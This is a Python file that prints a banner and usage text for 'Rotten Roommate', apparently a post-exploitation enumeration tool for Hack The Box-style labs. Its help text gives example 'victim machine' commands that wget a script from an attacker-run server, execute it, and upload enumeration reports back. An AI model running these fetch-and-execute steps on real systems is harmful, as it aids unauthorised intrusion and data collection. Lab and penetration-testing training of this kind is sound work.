import os

green = 'echo "\e[32m"'
red = 'echo "\e[31m"'
yellow = 'echo "\e[33m"'
plain = 'echo "\e[0m"'

def banner():
  os.system(yellow)
  print ('''

      01110010 01101111 01110100 01110100 01100101 01101110  01110010 01101111 01101111 01101101 01101101 01100001 01110100 01100101 

                >======>                  >=>     >=>                                            
                >=>    >=>                >=>     >=>                                            
                >=>    >=>      >=>     >=>>==> >=>>==>   >==>    >==>>==>                       
                >> >==>       >=>  >=>    >=>     >=>   >>   >=>   >=>  >=>                      
                >=>  >=>     >=>    >=>   >=>     >=>   >>===>>=>  >=>  >=>                      
                >=>    >=>    >=>  >=>    >=>     >=>   >>         >=>  >=>                      
                >=>      >=>    >=>        >=>     >=>   >====>   >==>  >=>                      

          >======>                                                                     >=>             
          >=>    >=>                                                                   >=>             
          >=>    >=>      >=>        >=>     >===>>=>>==>  >===>>=>>==>     >=> >=>  >=>>==>   >==>    
          >> >==>       >=>  >=>   >=>  >=>   >=>  >>  >=>  >=>  >>  >=>  >=>   >=>    >=>   >>   >=>  
          >=>  >=>     >=>    >=> >=>    >=>  >=>  >>  >=>  >=>  >>  >=> >=>    >=>    >=>   >>===>>=> 
          >=>    >=>    >=>  >=>   >=>  >=>   >=>  >>  >=>  >=>  >>  >=>  >=>   >=>    >=>   >>        
          >=>      >=>    >=>        >=>     >==>  >>  >=> >==>  >>  >=>   >==>>>==>    >=>   >====>   

      01110010 01101111 01110100 01110100 01100101 01101110  01110010 01101111 01101111 01101101 01101101 01100001 01110100 01100101
  01000001 01101110  01000101 01101110 01110101 01101101 01100101 01110010 01100001 01110100 01101001 01101111 01101110  01010100 01101111 01101111 01101100
  ''')
  os.system(plain)

def help():
  print ('''
   Usage:
           ./roommate.sh [-u] -i IP -p port [-o directory] [-w] [-r]\n
           Rotten Roommate is designed do host enumeration in environments like Hack The Box where 
           you do not have direct Internet access to download scripts and tools.\n
           It will download enumeration and exploit suggestion scripts to a target host and 
           automatically execute them, providing a saved text report for each tool, and 
           optionally upload the reports back top the host machine. Simply upload roommate.sh 
           to a host, run with the IP and port of the builtin web server hosting the tools 
           (or use your own), and they will be downloaded to /tmp (or an optional user-defined 
           directory) and executed, with report output being saved to /tmp or a custom directory.
           The reports can also optionally be uploaded back to your host machine.\n
           
           NOTE: Before running this tool on the target host, make sure to run it locally with 
           the update parameter in order to download all the necessary tools to the current 
           directory. Then start the builtin web server to host the tools and receive the reports.\n 
   Example:
           Host machine: root@kali:~/nosey_neighbor# ./roommate.py -u
           Host machine: root@kali:~/nosey_neighbor# ./roommate.py -i 10.10.14.1 -p 80 -w
           
           Linux Victim machine: www-data@victim:/tmp$ wget http://10.10.14.1:80/roommate.sh
           Linux Victim machine: www-data@victim:/tmp$ chmod +x ./roommate.sh
           Linux Victim machine: www-data@victim:/tmp$ ./roommate.sh -i 10.10.14.1 -p 80 -r\n
           
           Windows Victim machine: C:\Windows\temp wget http://10.10.14.1:80/roommate.bat
           Windows Victim machine: C:\Windows\temp .\roommate.bat
           Windows Victim machine: C:\Windows\temp .\roommate.bat -i 10.10.14.1 -p 80 -r\n
           
   Parameters:
           -h - View help and usage.
           -i IP - IP address of the listening web server used for upload and download.
           -p port - TCP port of the listening web server used for upload and download.
           -o directory - Custom download and report creation directory (default is /tmp).
           -w - Start builtin web server for downloading files and uploading reports.
           -u - Update to the latest versions of each tool, overwriting any existing versions.
           -r - Upload reports back to the host machine web server (must support PUT requests).
  ''')
  
banner()
help()
